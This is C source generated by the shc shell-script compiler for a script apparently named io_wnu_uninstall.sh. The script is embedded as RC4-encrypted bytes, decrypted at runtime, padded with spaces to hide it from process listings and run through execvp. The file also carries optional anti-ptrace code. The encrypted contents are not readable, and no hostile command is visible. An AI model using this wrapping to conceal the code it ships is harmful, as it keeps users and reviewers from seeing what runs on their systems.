#if 0
	shc Version 3.8.9b, Generic Script Compiler
	Copyright (c) 1994-2015 Francisco Rosales <frosal@fi.upm.es>

	./shc -v -r -T -f io_wnu_uninstall.sh 
#endif

static  char data [] = 
#define      text_z	1100
#define      text	((&data[58]))
	"\113\101\210\165\321\337\331\314\257\266\132\161\335\304\322\352"
	"\336\320\260\241\133\343\006\211\224\053\254\056\275\215\064\304"
	"\317\207\300\014\104\271\036\130\326\012\002\256\012\220\354\266"
	"\055\106\137\273\161\262\354\225\312\243\032\335\365\072\113\255"
	"\310\237\055\021\365\221\232\030\244\222\351\062\045\101\175\105"
	"\175\024\357\367\257\073\312\122\264\110\025\261\235\260\146\127"
	"\003\127\070\307\252\011\255\060\216\141\156\120\115\167\312\171"
	"\062\104\152\021\273\302\277\147\316\356\110\064\247\103\174\340"
	"\275\041\066\366\331\366\214\272\312\271\327\043\144\145\273\335"
	"\176\101\034\330\376\225\172\371\320\126\365\153\343\372\050\122"
	"\247\104\276\060\372\334\154\032\315\077\340\072\350\336\300\005"
	"\333\241\033\151\133\274\214\364\252\144\304\265\154\360\127\241"
	"\330\363\075\114\075\321\324\251\222\304\361\344\054\372\371\361"
	"\113\106\127\276\016\151\113\122\347\370\030\350\326\264\167\110"
	"\144\132\326\340\250\011\152\140\212\005\151\206\223\135\252\015"
	"\014\243\233\146\236\044\320\001\100\213\145\147\153\210\226\210"
	"\076\205\014\307\256\273\322\323\166\320\255\042\154\307\366\152"
	"\021\135\107\122\162\065\332\374\306\175\032\154\124\332\354\047"
	"\104\132\240\076\126\301\136\325\013\101\002\164\114\324\142\047"
	"\252\010\363\214\323\045\167\252\373\000\054\303\361\031\260\075"
	"\247\017\236\147\261\117\160\136\360\272\005\016\025\362\036\075"
	"\050\077\011\364\313\124\010\170\114\243\167\020\114\354\247\117"
	"\030\014\222\077\122\253\160\273\316\206\007\036\055\054\216\361"
	"\371\274\316\122\307\311\217\163\043\246\372\213\213\336\032\175"
	"\051\221\025\163\255\304\221\142\176\161\220\353\124\224\265\223"
	"\362\211\152\144\037\203\005\260\252\221\135\233\106\100\342\140"
	"\256\123\110\246\032\166\212\144\115\351\326\076\343\000\373\277"
	"\304\327\326\012\007\100\321\224\041\307\174\323\263\054\300\242"
	"\010\262\211\007\274\000\272\242\130\112\227\324\072\233\104\253"
	"\241\271\042\323\353\216\112\044\155\337\135\334\211\270\257\244"
	"\002\355\330\312\101\146\037\054\202\270\122\211\340\154\165\330"
	"\233\324\210\140\352\031\143\106\270\014\065\036\014\326\070\074"
	"\172\216\133\151\146\255\270\210\340\176\227\236\147\210\205\315"
	"\055\167\026\356\110\162\057\311\311\347\315\023\024\325\135\360"
	"\142\103\326\024\126\123\100\116\122\354\117\124\027\067\256\014"
	"\354\001\155\012\005\164\305\326\243\322\325\161\057\016\210\316"
	"\040\050\014\351\112\045\045\027\206\342\177\062\174\204\010\127"
	"\373\272\134\102\234\017\153\237\002\074\111\325\157\111\032\204"
	"\140\270\341\222\144\236\146\103\033\367\205\250\101\046\220\336"
	"\054\206\036\316\303\167\032\367\150\263\311\172\262\375\076\332"
	"\102\132\045\271\051\224\342\050\353\274\041\267\144\002\331\250"
	"\377\323\335\063\235\111\360\341\117\357\262\166\316\330\147\371"
	"\120\322\022\140\357\124\232\253\252\150\372\373\212\265\346\140"
	"\270\165\362\070\324\277\216\215\051\116\151\223\143\020\037\010"
	"\115\233\060\230\226\275\232\310\361\367\175\206\251\106\311\121"
	"\125\027\036\151\350\324\175\140\360\346\015\164\372\372\170\011"
	"\307\303\173\154\373\036\050\073\276\260\250\156\231\174\067\272"
	"\141\115\172\357\131\225\145\356\105\156\067\054\112\215\244\325"
	"\162\363\074\034\114\124\154\256\377\126\103\007\067\105\117\046"
	"\264\007\246\131\204\325\112\116\256\160\031\056\255\043\225\161"
	"\311\231\053\254\253\251\037\047\113\263\371\210\217\004\206\173"
	"\311\153\065\256\356\337\120\031\350\024\221\131\110\217\267\074"
	"\130\047\306\105\072\141\152\143\232\025\272\120\257\327\331\041"
	"\173\361\021\306\164\151\075\206\265\306\343\044\243\237\202\066"
	"\224\130\340\042\202\342\014\255\020\360\047\071\067\135\212\145"
	"\273\115\050\104\337\222\052\022\174\011\207\043\067\207\076\275"
	"\200\263\355\251\270\074\274\042\246\340\166\156\262\154\307\273"
	"\377\174\141\136\022\150\027\110\036\113\053\112\305\044\101\117"
	"\077\062\344\175\130\344\275\213\003\260\172\206\121\150\102\124"
	"\000\167\353\165\330\013\053\075\324\332\302\254\050\131\315\164"
	"\053\100\154\231\063\126\310\021\017\255\377\155\020\355\317\237"
	"\150\265\227\317\176\153\013\220\255\256\334\240\307\267\240\337"
	"\211\223\252\121\153\067\245\326\146\210\125\263\366\377\212\023"
	"\116\367\342\167\224\056\011\361\253\237\202\265\241\252\322\371"
	"\056\200\114\204\115\147\204\011\121\272\047\370\003\365\365\312"
	"\246\041\304\004\017\113\175\312\316\224\140\254\065\377\032\054"
	"\004\137\016\164\076\032\326\072\006\054\213\020\325\201\071\201"
	"\273\170\105\156\115\323\374\177\330\322\333\107\177\171\350\252"
	"\057\234\315\073\132\271\336\051\053\106\202\321\273\200\163\040"
	"\346\371\031\005\223\363\000\037\164\347\153\326\073\264\032\013"
	"\070\113\130\345\035\014\060\236\206\340\156\227\241\261\301\010"
	"\072\374\100\243\031\300\057\011\242\337\014\231\203\136\346\242"
	"\376\226\217\103\330\271\210\274\354\315\356\232\024\330\065\070"
	"\327\151\323\077\030\243\334\341\321\067\344\357\307\012\264\227"
	"\065\310\165\321\164\013\245\066\066\240\376\346\326\155\154\223"
	"\261\174\247"
#define      shll_z	10
#define      shll	((&data[1205]))
	"\212\241\366\373\073\071\357\063\347\232\165\226\303"
#define      lsto_z	1
#define      lsto	((&data[1216]))
	"\005"
#define      pswd_z	256
#define      pswd	((&data[1264]))
	"\220\041\252\202\162\166\237\236\046\172\117\073\143\010\126\370"
	"\214\363\366\122\154\001\367\170\105\257\353\037\034\075\204\042"
	"\053\160\350\343\074\171\166\206\154\130\203\147\273\013\006\225"
	"\363\224\235\343\352\212\246\311\037\210\243\175\320\226\336\043"
	"\256\364\043\250\146\017\374\125\206\055\123\062\361\161\366\043"
	"\030\037\367\076\316\165\341\121\124\300\163\366\364\265\315\177"
	"\155\350\103\117\006\164\053\216\015\263\276\053\036\363\267\343"
	"\314\166\266\116\252\240\041\273\224\310\252\337\277\020\172\252"
	"\057\034\135\162\070\267\005\056\074\042\125\111\140\137\174\151"
	"\256\061\015\357\364\311\373\136\334\162\136\271\357\050\217\003"
	"\223\274\341\244\350\354\051\374\230\257\344\255\100\342\020\162"
	"\076\127\314\062\264\150\114\275\220\223\221\353\141\115\063\131"
	"\144\147\231\366\334\306\324\057\101\017\356\031\177\247\350\271"
	"\344\146\021\166\276\172\310\264\177\122\045\220\131\020\176\051"
	"\166\004\216\254\353\232\277\101\250\332\353\332\047\136\245\273"
	"\300\116\342\062\226\270\315\017\123\337\123\053\360\121\305\047"
	"\131\304\260\321\276\306\302\061\062\231\377\267\040\257\256\143"
	"\262\164\150\315\251\272\353\161\275\054\362\036\016\037\304\300"
	"\002\132\052\374\044\217\224\137\302\066\125\041\120\072\311\366"
	"\376\257\353\152\011\306\367\315"
#define      msg1_z	42
#define      msg1	((&data[1534]))
	"\005\122\124\161\117\266\304\115\333\337\364\145\101\120\035\150"
	"\007\046\253\354\360\216\064\046\140\362\145\356\326\154\135\106"
	"\077\151\240\010\173\123\353\007\222\324\116\267\113\041\201"
#define      msg2_z	19
#define      msg2	((&data[1578]))
	"\343\001\001\324\010\357\042\340\030\344\256\030\254\354\213\011"
	"\271\244\333\355\312\100\314\043"
#define      tst1_z	22
#define      tst1	((&data[1603]))
	"\145\003\375\242\347\367\107\215\104\011\317\200\112\037\351\267"
	"\022\125\342\072\254\101\132\046\347\002\025\375\361"
#define      chk1_z	22
#define      chk1	((&data[1633]))
	"\112\150\143\206\225\364\206\026\071\371\263\116\230\252\344\037"
	"\374\352\164\105\306\371\325\247\100\077\205\116\206"
#define      inlo_z	3
#define      inlo	((&data[1658]))
	"\176\003\110"
#define      opts_z	1
#define      opts	((&data[1661]))
	"\165"
#define      rlax_z	1
#define      rlax	((&data[1662]))
	"\001"
#define      tst2_z	19
#define      tst2	((&data[1664]))
	"\143\167\206\212\365\333\352\027\213\257\010\136\133\122\366\235"
	"\036\234\155\243\363\102\355"
#define      chk2_z	19
#define      chk2	((&data[1686]))
	"\043\334\045\065\244\233\257\350\125\127\151\333\152\326\024\060"
	"\035\207\052\033\051\132"
#define      date_z	1
#define      date	((&data[1708]))
	"\101"
#define      xecc_z	15
#define      xecc	((&data[1709]))
	"\150\206\344\263\126\011\147\333\201\323\326\113\022\350\120"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
